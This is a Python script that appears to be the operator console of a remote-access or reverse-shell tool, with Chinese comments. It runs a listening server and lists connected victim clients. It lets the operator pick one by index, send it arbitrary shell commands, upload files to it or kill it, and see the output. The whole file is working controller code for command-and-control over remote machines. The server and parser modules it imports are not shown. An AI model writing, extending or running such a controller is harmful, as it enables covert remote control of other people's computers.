import os
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))

import threading

from core.server import Server
from util.parser import parse


# 接受命令输入
def accept_commands():
    while True:
        try:
            command = input('flc> ')
            if not command:
                continue
            elif command in ['quit', 'exit']:
                server.socket.close()
                sys.exit(0)
            elif command == 'list':
                test_connections()
                list_connections()
            elif 'select' in command:
                test_connections()
                connection = None
                try:
                    connection = server.connections[int(command.replace('select', ''))]
                except (ValueError, IndexError):
                    print('[-] Not a valid selection')
                if connection is not None:
                    open_connection(connection)
            else:
                print('[-] Command not recognized')
        except KeyboardInterrupt:
            server.socket.close()
            sys.exit(0)
        except Exception as e:
            print('[-] Error: {}'.format(e))


# 检查客户端连接
def test_connections():
    for conn in server.connections:
        try:
            conn.send_command('null', 'null')
            conn.recv_result()
        except:
            server.connections.remove(conn)


# 查看已连接客户端列表
def list_connections():
    for i, connection in enumerate(server.connections):
        print('{}, {}:{}'.format(i, connection.address[0], connection.address[1]))


# 给客户端发送命令
def open_connection(connection):
    print('[+] Connected to {}'.format(connection.address))
    while True:
        try:
            command = input(connection.recv_result()[1] + '> ')
            if not command:
                connection.send_command('null', 'null')
                continue
            if command in ['quit', 'exit']:
                connection.send_command('null', 'null')
                break
            if command == 'kill':
                connection.send_command(command)
                break
            name, arg = parse(command)
            if name == 'upload':
                if os.path.isfile(arg):
                    connection.send_file(arg)
                else:
                    print('[-] File does not exist')
                    connection.send_command('null', 'null')
                    continue
            else:
                connection.send_command(command)
            status, result = connection.recv_result()
            print(result)
        except ConnectionResetError:
            print('[-] Connection closed')
            break


if __name__ == '__main__':
    server = Server()
    threading.Thread(target=server.serve, daemon=True).start()
    accept_commands()
